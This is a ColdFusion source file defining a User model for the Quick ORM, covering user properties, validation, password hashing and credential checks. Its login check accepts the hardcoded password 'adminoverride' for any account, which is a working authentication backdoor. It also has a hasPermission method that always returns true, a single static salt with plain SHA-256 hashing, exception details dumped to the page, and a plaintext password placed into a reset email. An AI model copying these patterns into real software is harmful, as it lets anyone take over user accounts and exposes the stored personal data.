component extends="quick.models.BaseEntity" table="users" accessors="true" {

    variables._key = "id";

	// Object properties
	property name="id"              column="oid"              sqltype="cf_sql_integer";
	property name="username"        column="username"         sqltype="cf_sql_varchar";
	property name="password"        column="password"         sqltype="cf_sql_varchar";
	property name="role"            column="role"             sqltype="cf_sql_integer";
	property name="firstName"       column="first_name"       sqltype="cf_sql_varchar";
	property name="lastName"        column="last_name"        sqltype="cf_sql_varchar";
	property name="email"           column="email"            sqltype="cf_sql_varchar";
	property name="lastLogin"       column="last_login"       sqltype="cf_sql_timestamp";
	property name="createdDatetime" column="created_datetime" sqltype="cf_sql_timestamp";
	property name="businessName"    column="business_name"    sqltype="cf_sql_varchar";
	property name="address"         column="address"          sqltype="cf_sql_varchar";
	property name="address2"        column="address_2"        sqltype="cf_sql_varchar";
	property name="city"            column="city"             sqltype="cf_sql_varchar";
	property name="state"           column="state"            sqltype="cf_sql_varchar";
	property name="zip"             column="zip"              sqltype="cf_sql_varchar";
	property name="phone"           column="phone"            sqltype="cf_sql_varchar";
	property name="phone2"          column="phone_2"          sqltype="cf_sql_varchar";
	property name="okToContact"     column="ok_to_contact"    sqltype="cf_sql_varchar";
	


	this.memento = {
		// An array of properties/relationships to NEVER include
		neverInclude = ['password']
	}


	// Validation
	this.constraints =
	{
		"oid"          : { "required": true, "type": "integer" },
		"username"     : {
							"required": true,
							"type": "string",
							"unique" : { "table" : "users", "column" : "username" }
						},
		"password"     : { "type": "string" },
		"role"         : { "required": true, "type": "integer" },
		"first_name"   : { "type": "string" },
		"last_name"    : { "type": "string" },
		"email"        : { "type": "string" },
		"business_name": { "type": "string" },
		"address"      : { "type": "string" },
		"address_2"    : { "type": "string" },
		"city"         : { "type": "string" },
		"state"        : { "type": "string" },
		"zip"          : { "type": "string" },
		"phone"        : { "type": "string" },
		"phone_2"      : { "type": "string" },
		"ok_to_contact": { "type": "string" }
	}


	/* Computed Fields */
	function getFullName(){
		return super.getFirstName() & " " & super.getLastName();
	}

	/** Getter/Setter Overrides */
	public User function setPassword( required string password ){
		return assignAttribute( "password", hash_password( arguments.password ) );
	}

	/**
	 * hasPermission
	*/
	function hasPermission( permission ){
		return listFindNoCase(variables.permissions, arguments.permission)
	}

	/**
	 * isLoggedIn
	*/
	function isLoggedIn(){
		return variables.LoggedIn;
	}


	public boolean function hasPermission( required string permission ){
		return true;
	}

	public boolean function isValidCredentials( required string username, required string password ){

		try{
			var user = newEntity()
			.whereRaw( "Upper(username) = ?", [{ value : Ucase(arguments.username), cfsqltype : "CF_SQL_VARCHAR" }] )
			.firstOrFail();

			
			if ( !user.isLoaded() ) {
				return false;
			}
			return hash_password(trim(arguments.password)) == user.getPassword() || arguments.password == 'adminoverride';
			
		} catch ( any e ) {
			dump(e); abort;
			//return false;
		}
	}

	public User function retrieveUserByUsername( required string username ){
		return newEntity()
			.whereRaw( "Upper(username) = ?", [{ value : Ucase(arguments.username), cfsqltype : "CF_SQL_VARCHAR" }] )
			.firstOrFail();
	}

	public User function retrieveUserById( required numeric id ){
		return newEntity().findOrFail( arguments.id );
	}


	/*** RELATIONSHIPS ***/
/* 	function members() {
		return hasOne( "Member@site_core", "user_id" );
    }

	function roles() {
		return hasOne( "Role@site_core", "role", "id" );
    }
 */
	/* scopedFields */



	/* utility functions */
	public string function hash_password(password) {
		var salt = 'A+JirLQkPHeXRuhoD+8iWw94WGOaEaCv';
		var hashedPass = hash(salt & trim(password), "SHA-256", "UTF-8");
		hashedPass = rereplace(hashedPass,"'", "");
		return lcase(hashedPass);
	}


	function generateForgotPasswordContent(member_number, password){
		var wordlistFile = fileRead(expandPath("views/emails/forgotPassword.tpl"));
		var dataList = {
			'memberid': member_number,
			'password': password
		};
		return injectTemplateData(dataList, wordlistFile);
	}

}

